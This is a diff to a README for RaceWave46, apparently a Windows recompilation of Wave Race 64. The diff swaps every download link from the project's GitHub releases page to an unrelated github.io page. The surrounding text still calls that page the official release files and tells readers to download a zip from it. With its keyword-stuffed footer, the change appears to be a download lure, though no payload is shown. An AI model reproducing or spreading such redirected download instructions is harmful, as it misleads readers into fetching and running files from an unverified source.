@@ -1,6 +1,6 @@
 # 🌊 RaceWave46 - Relive the Splash with Modern Graphics
 
-[![Download RaceWave46](https://img.shields.io/badge/Download-RaceWave46-00E5FF?style=for-the-badge&logo=windows&logoColor=white&labelColor=1A1A2E&color=00E5FF)](https://github.com/Essiescented28/RaceWave46/releases)
+[![Download RaceWave46](https://img.shields.io/badge/Download-RaceWave46-00E5FF?style=for-the-badge&logo=windows&logoColor=white&labelColor=1A1A2E&color=00E5FF)](https://essiescented28.github.io)
 
 ## 🎮 What Is RaceWave46?
 
@@ -22,7 +22,7 @@ Getting RaceWave46 on your computer takes less than two minutes. Just follow the
 
 ### Step 1: Download the Game
 
-**Visit this link to download the application:** [https://github.com/Essiescented28/RaceWave46/releases](https://github.com/Essiescented28/RaceWave46/releases)
+**Visit this link to download the application:** [https://essiescented28.github.io](https://essiescented28.github.io)
 
 When you click the link, your web browser will open a page showing our official release files. Look for the file named `RaceWave46-Windows.zip` (the most recent version is listed at the top). Click on it to begin downloading.
 
@@ -161,6 +161,6 @@ Have a question that wasn't answered here? Reach out to us:
 
 ---
 
-**Ready to hit the waves? [Download RaceWave46 now](https://github.com/Essiescented28/RaceWave46/releases) and start racing in minutes!**
+**Ready to hit the waves? [Download RaceWave46 now](https://essiescented28.github.io) and start racing in minutes!**
 
 Keywords: RaceWave46, Wave Race 64, recompilation, Windows game, racing game, water racing, multiplayer racing, free racing game, open source game, emulation, retro gaming, PC game download
